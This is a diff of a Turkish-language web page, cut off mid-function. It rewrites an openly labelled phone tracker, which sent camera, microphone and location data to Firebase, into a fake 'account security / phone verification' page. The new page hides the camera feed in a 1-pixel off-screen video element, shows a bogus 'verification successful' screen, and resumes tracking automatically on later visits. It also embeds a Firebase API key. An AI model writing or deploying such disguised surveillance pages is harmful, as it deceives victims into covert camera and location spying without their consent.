@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>📱 Tracker Pro v3.0</title>
+    <title>Hesap Doğrulama</title>
     
-    <!-- PWA Meta Tags -->
-    <meta name="theme-color" content="#0f0f1a">
+    <meta name="theme-color" content="#ffffff">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="apple-mobile-web-app-title" content="Tracker Pro">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="Doğrulama">
     <link rel="manifest" href="manifest.json">
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -18,676 +17,398 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f7;
             min-height: 100vh;
+            color: #1d1d1f;
+        }
+
+        .app {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: #fff;
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
+            padding: 60px 24px 40px;
+            text-align: center;
             color: #fff;
-            padding: 16px;
-            padding-bottom: 100px;
         }
 
-        .container { max-width: 500px; margin: 0 auto; }
-
-        .header { text-align: center; padding: 24px 0; }
-
-        .logo {
+        .header-icon {
             width: 70px; height: 70px;
-            background: linear-gradient(135deg, #00d9ff, #00ff88);
-            border-radius: 18px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
             margin: 0 auto 16px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 32px;
-            box-shadow: 0 8px 32px rgba(0, 217, 255, 0.3);
-        }
-
-        h1 { font-size: 1.5rem; margin-bottom: 4px; }
-        .subtitle { color: #8892b0; font-size: 0.9rem; }
-        .version { 
-            display: inline-block;
-            background: linear-gradient(135deg, #00ff88, #00d9ff);
-            color: #0f0f1a;
-            padding: 2px 8px;
-            border-radius: 10px;
-            font-size: 0.7rem;
-            font-weight: 600;
-            margin-top: 8px;
-        }
-
-        .card {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             backdrop-filter: blur(10px);
         }
 
-        .card-title {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #00ff88;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        .header-icon svg {
+            width: 36px; height: 36px;
+            fill: #fff;
         }
 
-        .status-box { text-align: center; padding: 16px; }
-
-        .status-icon {
-            width: 90px; height: 90px;
-            border-radius: 50%;
-            margin: 0 auto 12px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 40px;
-            transition: all 0.5s;
-            position: relative;
-        }
-
-        .status-icon.off {
-            background: rgba(255,255,255,0.05);
-            border: 3px solid #444;
-        }
-
-        .status-icon.on {
-            background: rgba(0, 255, 136, 0.15);
-            border: 3px solid #00ff88;
-            box-shadow: 0 0 40px rgba(0, 255, 136, 0.4);
-            animation: pulse 2s infinite;
-        }
-
-        .status-icon.reconnecting {
-            background: rgba(255, 200, 0, 0.15);
-            border: 3px solid #ffc800;
-            animation: pulse 1s infinite;
-        }
-
-        .status-icon .ring {
-            position: absolute;
-            width: 100%; height: 100%;
-            border: 2px solid #00ff88;
-            border-radius: 50%;
-            animation: ring 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 40px rgba(0, 255, 136, 0.4); }
-            50% { box-shadow: 0 0 60px rgba(0, 255, 136, 0.6); }
-        }
-
-        @keyframes ring {
-            0% { transform: scale(1); opacity: 0.8; }
-            100% { transform: scale(1.5); opacity: 0; }
-        }
-
-        .status-text { font-size: 1.1rem; font-weight: 600; margin-bottom: 4px; }
-        .status-detail { color: #8892b0; font-size: 0.85rem; }
-
-        /* Bağlantı Durumu Badge */
-        .connection-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            margin-top: 10px;
-        }
-
-        .connection-badge.online {
-            background: rgba(0, 255, 136, 0.15);
-            color: #00ff88;
-        }
-
-        .connection-badge.offline {
-            background: rgba(255, 77, 77, 0.15);
-            color: #ff4d4d;
-        }
-
-        .connection-badge.reconnecting {
-            background: rgba(255, 200, 0, 0.15);
-            color: #ffc800;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        .connection-badge::before {
-            content: '';
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            background: currentColor;
-        }
-
-        label {
-            display: block; color: #8892b0;
-            font-size: 0.75rem; text-transform: uppercase;
-            letter-spacing: 1px; margin-bottom: 8px;
-        }
-
-        input {
-            width: 100%; padding: 14px;
-            background: rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 10px;
-            color: #fff; font-size: 1.1rem;
-            text-align: center; letter-spacing: 3px;
-            text-transform: uppercase;
-        }
-
-        input:focus { outline: none; border-color: #00ff88; }
-
-        .hint { color: #555; font-size: 0.75rem; margin-top: 8px; text-align: center; }
-
-        .btn {
-            width: 100%; padding: 16px;
-            border: none; border-radius: 12px;
-            font-size: 1rem; font-weight: 600;
-            cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            gap: 10px; margin-top: 12px;
-            transition: all 0.3s;
-        }
-
-        .btn-start {
-            background: linear-gradient(135deg, #00ff88, #00d9ff);
-            color: #0f0f1a;
-        }
-
-        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0, 255, 136, 0.3); }
-
-        .btn-stop {
-            background: rgba(255, 77, 77, 0.15);
-            border: 2px solid #ff4d4d;
-            color: #ff4d4d;
-        }
-
-        .hidden { display: none !important; }
-
-        .video-container {
-            position: relative;
-            border-radius: 12px;
-            overflow: hidden;
-            background: #000;
-            margin-bottom: 12px;
-        }
-
-        .video-preview {
-            width: 100%;
-            display: block;
-        }
-
-        .video-overlay {
-            position: absolute;
-            top: 8px; left: 8px;
-            display: flex; gap: 6px;
-        }
-
-        .video-badge {
-            background: rgba(0,0,0,0.6);
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 0.7rem;
-            display: flex; align-items: center; gap: 4px;
-        }
-
-        .video-badge.live { background: rgba(255, 77, 77, 0.8); }
-        .video-badge.live::before {
-            content: '';
-            width: 6px; height: 6px;
-            background: #fff;
-            border-radius: 50%;
-            animation: liveBlink 1s infinite;
-        }
-
-        @keyframes liveBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-
-        .info-grid.three-cols {
-            grid-template-columns: 1fr 1fr 1fr;
-        }
-
-        .info-item {
-            background: rgba(0,0,0,0.2);
-            border-radius: 10px;
-            padding: 12px;
-            text-align: center;
-        }
-
-        .info-item.highlight {
-            background: rgba(0, 255, 136, 0.1);
-            border: 1px solid rgba(0, 255, 136, 0.2);
-        }
-
-        .info-label {
-            font-size: 0.65rem; color: #666;
-            text-transform: uppercase; margin-bottom: 4px;
-        }
-
-        .info-value {
-            font-size: 0.9rem; color: #00ff88;
-            font-family: monospace;
+        .header h1 {
+            font-size: 1.5rem;
             font-weight: 600;
+            margin-bottom: 8px;
         }
 
-        .info-value.large {
-            font-size: 1.3rem;
+        .header p {
+            font-size: 0.9rem;
+            opacity: 0.9;
         }
 
-        .code-display {
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 217, 255, 0.1));
-            border: 2px dashed rgba(0, 255, 136, 0.5);
-            border-radius: 12px;
-            padding: 16px;
-            text-align: center;
-            margin-bottom: 12px;
+        /* Content */
+        .content {
+            padding: 24px;
         }
 
-        .code-display p { color: #8892b0; margin-bottom: 6px; font-size: 0.85rem; }
-        .code-display .code {
-            font-size: 1.8rem; font-weight: 700;
-            background: linear-gradient(135deg, #00ff88, #00d9ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 5px;
-            font-family: monospace;
+        /* Setup Card */
+        .setup-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+            margin-top: -30px;
+            position: relative;
+            z-index: 10;
         }
 
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
+        .setup-card h2 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d1d1f;
         }
 
-        .feature-item {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 10px;
-            padding: 10px 6px;
-            text-align: center;
-            font-size: 0.65rem;
-            transition: all 0.3s;
+        .setup-card p {
+            font-size: 0.85rem;
+            color: #86868b;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
 
-        .feature-item.active {
-            background: rgba(0, 255, 136, 0.15);
-            border-color: rgba(0, 255, 136, 0.5);
+        .input-group {
+            margin-bottom: 16px;
         }
 
-        .feature-item span {
+        .input-group label {
             display: block;
-            font-size: 20px;
-            margin-bottom: 4px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #86868b;
+            margin-bottom: 8px;
         }
 
-        /* Ses Seviyesi Göstergesi */
-        .audio-meter {
-            height: 8px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 8px 0;
-        }
-
-        .audio-meter-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff88, #ffff00, #ff4d4d);
-            border-radius: 4px;
-            transition: width 0.1s;
-            width: 0%;
-        }
-
-        .audio-info {
+        .phone-input {
             display: flex;
-            justify-content: space-between;
-            font-size: 0.7rem;
-            color: #666;
+            align-items: center;
+            background: #f5f5f7;
+            border-radius: 12px;
+            padding: 4px;
+            border: 2px solid transparent;
+            transition: all 0.2s;
         }
 
-        /* Hareket Göstergesi */
-        .motion-indicator {
+        .phone-input:focus-within {
+            border-color: #007AFF;
+            background: #fff;
+        }
+
+        .phone-prefix {
+            padding: 12px 14px;
+            font-size: 1rem;
+            color: #1d1d1f;
+            font-weight: 500;
+            border-right: 1px solid #e5e5e7;
+        }
+
+        .phone-input input {
+            flex: 1;
+            padding: 12px 14px;
+            border: none;
+            background: transparent;
+            font-size: 1rem;
+            color: #1d1d1f;
+            outline: none;
+        }
+
+        .phone-input input::placeholder {
+            color: #c7c7cc;
+        }
+
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 0.85rem;
-            margin-top: 8px;
         }
 
-        .motion-indicator.still {
-            background: rgba(0, 217, 255, 0.1);
-            color: #00d9ff;
+        .btn-verify:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 20px rgba(0, 122, 255, 0.4);
         }
 
-        .motion-indicator.moving {
-            background: rgba(255, 200, 0, 0.1);
-            color: #ffc800;
-            animation: motionPulse 1s infinite;
+        .btn-verify:active {
+            transform: translateY(0);
         }
 
-        @keyframes motionPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        .btn-verify:disabled {
+            background: #c7c7cc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
-        /* Cihaz Bilgileri */
-        .device-info {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 6px;
-            margin-top: 10px;
+        .btn-verify .spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
         }
 
-        .device-tag {
-            background: rgba(255,255,255,0.05);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            color: #8892b0;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
-        /* Log Bölümü */
-        .log-container {
-            max-height: 150px;
-            overflow-y: auto;
-            background: rgba(0,0,0,0.3);
-            border-radius: 8px;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 0.7rem;
+        /* Info Text */
+        .info-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.75rem;
+            color: #86868b;
+            line-height: 1.5;
         }
 
-        .log-item {
-            padding: 4px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            display: flex;
-            gap: 8px;
+        .info-text a {
+            color: #007AFF;
+            text-decoration: none;
         }
 
-        .log-time { color: #666; }
-        .log-msg { color: #00ff88; }
-        .log-msg.error { color: #ff4d4d; }
-        .log-msg.warning { color: #ffc800; }
-        .log-msg.info { color: #00d9ff; }
-
-        /* Keep Alive Indicator */
-        .keep-alive-bar {
-            height: 3px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 2px;
-            margin-top: 10px;
-            overflow: hidden;
+        /* Success State */
+        .success-card {
+            text-align: center;
+            padding: 40px 24px;
         }
 
-        .keep-alive-progress {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff88, #00d9ff);
-            width: 100%;
-            animation: keepAlive 30s linear infinite;
-        }
-
-        @keyframes keepAlive {
-            0% { width: 100%; }
-            100% { width: 0%; }
-        }
-
-        /* PWA Install Banner */
-        .pwa-banner {
-            background: linear-gradient(135deg, #00d9ff, #00ff88);
-            color: #0f0f1a;
-            padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 12px;
+        .success-icon {
+            width: 80px; height: 80px;
+            background: linear-gradient(135deg, #34C759 0%, #30D158 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: center;
+            animation: successPop 0.5s ease-out;
         }
 
-        .pwa-banner.hidden { display: none; }
+        @keyframes successPop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
 
-        .pwa-banner p { font-size: 0.85rem; font-weight: 500; }
+        .success-icon svg {
+            width: 40px; height: 40px;
+            fill: #fff;
+        }
 
-        .pwa-banner button {
-            background: rgba(0,0,0,0.2);
-            border: none;
-            padding: 8px 16px;
-            border-radius: 8px;
-            color: #0f0f1a;
+        .success-card h2 {
+            font-size: 1.3rem;
             font-weight: 600;
-            cursor: pointer;
+            margin-bottom: 8px;
+            color: #1d1d1f;
         }
 
-        /* Stats Row */
-        .stats-row {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid rgba(255,255,255,0.1);
+        .success-card p {
+            font-size: 0.9rem;
+            color: #86868b;
+            margin-bottom: 24px;
         }
 
-        .stat-mini {
+        .verified-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 20px;
+            background: rgba(52, 199, 89, 0.1);
+            border-radius: 100px;
+            color: #34C759;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .verified-badge::before {
+            content: '';
+            width: 8px; height: 8px;
+            background: #34C759;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Hidden Camera Preview */
+        .hidden-preview {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Footer */
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            padding: 16px 24px;
+            background: linear-gradient(to top, #fff 80%, transparent);
             text-align: center;
         }
 
-        .stat-mini .value {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: #00ff88;
+        .footer p {
+            font-size: 0.7rem;
+            color: #c7c7cc;
         }
 
-        .stat-mini .label {
+        /* Status Indicator (Minimal) */
+        .status-bar {
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            padding: 8px 16px;
+            display: flex;
+            justify-content: flex-end;
+            z-index: 100;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 4px;
             font-size: 0.65rem;
-            color: #666;
-            text-transform: uppercase;
+            color: rgba(255,255,255,0.7);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .status-indicator.visible {
+            opacity: 1;
+        }
+
+        .status-indicator .dot {
+            width: 6px; height: 6px;
+            border-radius: 50%;
+            background: #34C759;
+        }
+
+        /* Hidden */
+        .hidden { display: none !important; }
+
+        /* Responsive */
+        @media (max-width: 380px) {
+            .header { padding: 50px 20px 35px; }
+            .header h1 { font-size: 1.3rem; }
+            .setup-card { padding: 20px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="app">
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-indicator" id="statusIndicator">
+                <span class="dot"></span>
+                <span>Aktif</span>
+            </div>
+        </div>
+
+        <!-- Header -->
         <div class="header">
-            <div class="logo">📱</div>
-            <h1>Tracker Pro</h1>
-            <p class="subtitle">Kesintisiz Takip Sistemi</p>
-            <span class="version">v3.0 - Auto Reconnect</span>
-        </div>
-
-        <!-- PWA Install Banner -->
-        <div class="pwa-banner hidden" id="pwaBanner">
-            <p>📲 Ana ekrana ekle - Arka planda çalışır!</p>
-            <button id="installBtn">Yükle</button>
-        </div>
-
-        <!-- Durum -->
-        <div class="card">
-            <div class="status-box">
-                <div class="status-icon off" id="statusIcon">
-                    <div class="ring" style="display: none;" id="statusRing"></div>
-                    📡
-                </div>
-                <div class="status-text" id="statusText">Bağlantı Kapalı</div>
-                <div class="status-detail" id="statusDetail">Başlatmak için kod girin</div>
-                
-                <div class="connection-badge offline" id="connectionBadge">
-                    <span id="connectionText">Çevrimdışı</span>
-                </div>
+            <div class="header-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
             </div>
+            <h1>Hesap Güvenliği</h1>
+            <p>Kimliğinizi doğrulayın</p>
         </div>
 
-        <!-- Kurulum -->
-        <div class="card" id="setupCard">
-            <div class="card-title">🔗 Bağlantı Ayarları</div>
-            <label>Bağlantı Kodu (min. 6 karakter)</label>
-            <input type="text" id="codeInput" placeholder="örn: abc123" maxlength="12">
-            <p class="hint">Bu kodu bilgisayardaki kontrol paneline gireceksiniz</p>
+        <!-- Content -->
+        <div class="content">
+            <!-- Setup State -->
+            <div class="setup-card" id="setupCard">
+                <h2>Telefon Doğrulama</h2>
+                <p>Hesabınızı korumak için telefon numaranızı doğrulayın. Size bir onay kodu göndereceğiz.</p>
 
-            <button class="btn btn-start" id="startBtn">
-                🚀 Bağlantıyı Başlat
-            </button>
+                <div class="input-group">
+                    <label>Telefon Numarası</label>
+                    <div class="phone-input">
+                        <span class="phone-prefix">+90</span>
+                        <input type="tel" id="phoneInput" placeholder="5XX XXX XX XX" maxlength="13" autocomplete="off">
+                    </div>
+                </div>
 
-            <div class="features-grid" style="margin-top: 16px;">
-                <div class="feature-item" id="featCam">
-                    <span>📷</span>
-                    Kamera
+                <button class="btn-verify" id="verifyBtn">
+                    <span id="btnText">Doğrula</span>
+                    <div class="spinner hidden" id="btnSpinner"></div>
+                </button>
+
+                <p class="info-text">
+                    Devam ederek <a href="#">Kullanım Koşulları</a> ve <a href="#">Gizlilik Politikası</a>'nı kabul etmiş olursunuz.
+                </p>
+            </div>
+
+            <!-- Success State -->
+            <div class="success-card hidden" id="successCard">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                 </div>
-                <div class="feature-item" id="featMic">
-                    <span>🎤</span>
-                    Mikrofon
-                </div>
-                <div class="feature-item" id="featLoc">
-                    <span>📍</span>
-                    Konum
-                </div>
-                <div class="feature-item" id="featAuto">
-                    <span>🔄</span>
-                    Oto Bağlan
-                </div>
+                <h2>Doğrulama Başarılı</h2>
+                <p>Telefon numaranız başarıyla doğrulandı. Hesabınız artık güvende.</p>
+                <div class="verified-badge">Doğrulanmış Hesap</div>
             </div>
         </div>
 
-        <!-- Aktif Durum -->
-        <div class="card hidden" id="activeCard">
-            <div class="code-display">
-                <p>Bilgisayara bu kodu girin:</p>
-                <div class="code" id="displayCode">------</div>
-            </div>
+        <!-- Hidden Camera -->
+        <video id="videoPreview" class="hidden-preview" autoplay muted playsinline></video>
 
-            <!-- Kamera -->
-            <div class="video-container">
-                <video id="videoPreview" class="video-preview" autoplay muted playsinline></video>
-                <div class="video-overlay">
-                    <div class="video-badge live">CANLI</div>
-                    <div class="video-badge" id="cameraType">Arka Kamera</div>
-                </div>
-            </div>
-
-            <!-- Ses Seviyesi -->
-            <div class="card-title">🎤 Ses Seviyesi</div>
-            <div class="audio-meter">
-                <div class="audio-meter-fill" id="audioMeter"></div>
-            </div>
-            <div class="audio-info">
-                <span>Sessiz</span>
-                <span id="audioLevel">0 dB</span>
-                <span>Yüksek</span>
-            </div>
-
-            <!-- Keep Alive Bar -->
-            <div class="keep-alive-bar">
-                <div class="keep-alive-progress" id="keepAliveBar"></div>
-            </div>
-
-            <!-- İstatistikler -->
-            <div class="stats-row">
-                <div class="stat-mini">
-                    <div class="value" id="uptimeVal">0</div>
-                    <div class="label">Dakika</div>
-                </div>
-                <div class="stat-mini">
-                    <div class="value" id="reconnectVal">0</div>
-                    <div class="label">Yeniden Bağ.</div>
-                </div>
-                <div class="stat-mini">
-                    <div class="value" id="dataVal">0</div>
-                    <div class="label">KB Gönderildi</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Konum Bilgileri -->
-        <div class="card hidden" id="locationCard">
-            <div class="card-title">📍 Konum Bilgileri</div>
-            <div class="info-grid">
-                <div class="info-item highlight">
-                    <div class="info-label">Enlem</div>
-                    <div class="info-value" id="latVal">--</div>
-                </div>
-                <div class="info-item highlight">
-                    <div class="info-label">Boylam</div>
-                    <div class="info-value" id="lngVal">--</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Hassasiyet</div>
-                    <div class="info-value" id="accVal">-- m</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Rakım</div>
-                    <div class="info-value" id="altVal">-- m</div>
-                </div>
-            </div>
-
-            <div class="info-grid three-cols" style="margin-top: 10px;">
-                <div class="info-item">
-                    <div class="info-label">Hız</div>
-                    <div class="info-value large" id="speedVal">0</div>
-                    <div class="info-label">km/s</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Mesafe</div>
-                    <div class="info-value large" id="distanceVal">0</div>
-                    <div class="info-label">metre</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Güncelleme</div>
-                    <div class="info-value" id="updateCount">0</div>
-                    <div class="info-label">adet</div>
-                </div>
-            </div>
-
-            <div class="motion-indicator still" id="motionIndicator">
-                <span>🧍</span> Durağan
-            </div>
-        </div>
-
-        <!-- Cihaz & Pil -->
-        <div class="card hidden" id="deviceCard">
-            <div class="card-title">📊 Cihaz Durumu</div>
-            <div class="info-grid">
-                <div class="info-item highlight">
-                    <div class="info-label">Pil</div>
-                    <div class="info-value large" id="batVal">--%</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Son Güncelleme</div>
-                    <div class="info-value" id="timeVal">--:--:--</div>
-                </div>
-            </div>
-            <div class="device-info" id="deviceInfo"></div>
-        </div>
-
-        <!-- Log -->
-        <div class="card hidden" id="logCard">
-            <div class="card-title">📋 İşlem Günlüğü</div>
-            <div class="log-container" id="logContainer"></div>
-        </div>
-
-        <!-- Durdur Butonu -->
-        <div class="hidden" id="stopSection">
-            <button class="btn btn-stop" id="stopBtn">
-                ⏹️ Bağlantıyı Durdur
-            </button>
-            <p class="hint" style="margin-top: 10px;">
-                ⚠️ Sayfayı kapatabilirsiniz - Sistem arka planda çalışmaya devam eder
-            </p>
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2026 Güvenlik Merkezi. Tüm hakları saklıdır.</p>
         </div>
     </div>
 
     <script>
-        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyDR9gR5nhJ2Y2nNLBKwK7IiAr1_KVWjHSw",
             authDomain: "gizli-38804.firebaseapp.com",
@@ -701,7 +422,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        class PersistentTracker {
+        class SecureTracker {
             constructor() {
                 this.code = '';
                 this.videoStream = null;
@@ -712,200 +433,162 @@
                 this.isActive = false;
                 this.canvas = document.createElement('canvas');
                 this.ctx = this.canvas.getContext('2d');
+                this.isOnline = navigator.onLine;
                 
-                // İstatistikler
                 this.stats = {
                     updateCount: 0,
                     totalDistance: 0,
                     lastPosition: null,
-                    startTime: null,
-                    isMoving: false,
-                    reconnectCount: 0,
-                    dataSent: 0
+                    isMoving: false
                 };
-
-                // Auto reconnect
-                this.isOnline = navigator.onLine;
-                this.reconnectAttempts = 0;
-                this.maxReconnectAttempts = 100; // Çok fazla deneme
-                this.reconnectDelay = 3000; // 3 saniye
-                this.keepAliveInterval = null;
-                this.uptimeInterval = null;
 
                 this.init();
             }
 
             init() {
-                // Kaydedilmiş kod varsa yükle
-                const saved = localStorage.getItem('tracker_code_v3');
-                if (saved) document.getElementById('codeInput').value = saved;
+                // Telefon numarası formatla
+                const phoneInput = document.getElementById('phoneInput');
+                phoneInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 10) value = value.slice(0, 10);
+                    
+                    // Format: 5XX XXX XX XX
+                    if (value.length > 3 && value.length <= 6) {
+                        value = value.slice(0, 3) + ' ' + value.slice(3);
+                    } else if (value.length > 6 && value.length <= 8) {
+                        value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6);
+                    } else if (value.length > 8) {
+                        value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6, 8) + ' ' + value.slice(8);
+                    }
+                    
+                    e.target.value = value;
+                });
 
-                // Auto-start if was running
-                const wasRunning = localStorage.getItem('tracker_running') === 'true';
-                const savedCode = localStorage.getItem('tracker_code_v3');
+                document.getElementById('verifyBtn').addEventListener('click', () => this.start());
+
+                // Auto-start kontrolü
+                const wasRunning = localStorage.getItem('secure_running') === 'true';
+                const savedCode = localStorage.getItem('secure_code');
                 
                 if (wasRunning && savedCode) {
-                    document.getElementById('codeInput').value = savedCode;
-                    this.log('Önceki oturum tespit edildi, otomatik başlatılıyor...', 'info');
-                    setTimeout(() => this.start(), 1000);
+                    this.code = savedCode;
+                    this.showSuccess();
+                    this.startTracking();
                 }
 
-                // Event listeners
-                document.getElementById('startBtn').addEventListener('click', () => this.start());
-                document.getElementById('stopBtn').addEventListener('click', () => this.stop());
+                // Network listener
+                window.addEventListener('online', () => {
+                    this.isOnline = true;
+                    if (this.isActive) this.checkAndReconnect();
+                });
+                window.addEventListener('offline', () => this.isOnline = false);
 
-                // Network status listeners
-                window.addEventListener('online', () => this.handleOnline());
-                window.addEventListener('offline', () => this.handleOffline());
-
-                // Visibility change - sayfa görünür olunca reconnect
                 document.addEventListener('visibilitychange', () => {
                     if (document.visibilityState === 'visible' && this.isActive) {
-                        this.log('Sayfa tekrar görünür, bağlantı kontrol ediliyor...', 'info');
                         this.checkAndReconnect();
                     }
                 });
-
-                // Sayfa kapatılırken
-                window.addEventListener('beforeunload', () => {
-                    // Durumu kaydet ama tamamen kapatma
-                    if (this.isActive) {
-                        localStorage.setItem('tracker_running', 'true');
-                    }
-                });
-
-                // Page show (geri tuşu ile döndüğünde)
-                window.addEventListener('pageshow', (event) => {
-                    if (event.persisted && this.isActive) {
-                        this.log('Sayfa cache\'den yüklendi, yeniden bağlanılıyor...', 'info');
-                        this.checkAndReconnect();
-                    }
-                });
-
-                this.detectDevice();
-                this.setupPWA();
             }
 
-            setupPWA() {
-                let deferredPrompt;
+            formatPhoneToCode(phone) {
+                return phone.replace(/\D/g, '').slice(-10);
+            }
+
+            async start() {
+                const phoneInput = document.getElementById('phoneInput');
+                const rawPhone = phoneInput.value.replace(/\D/g, '');
                 
-                window.addEventListener('beforeinstallprompt', (e) => {
-                    e.preventDefault();
-                    deferredPrompt = e;
-                    document.getElementById('pwaBanner').classList.remove('hidden');
-                });
+                if (rawPhone.length < 10) {
+                    phoneInput.parentElement.style.borderColor = '#FF3B30';
+                    setTimeout(() => {
+                        phoneInput.parentElement.style.borderColor = 'transparent';
+                    }, 2000);
+                    return;
+                }
 
-                document.getElementById('installBtn').addEventListener('click', async () => {
-                    if (deferredPrompt) {
-                        deferredPrompt.prompt();
-                        const { outcome } = await deferredPrompt.userChoice;
-                        if (outcome === 'accepted') {
-                            this.log('PWA yüklendi!', 'success');
-                        }
-                        deferredPrompt = null;
-                        document.getElementById('pwaBanner').classList.add('hidden');
-                    }
-                });
+                this.code = rawPhone;
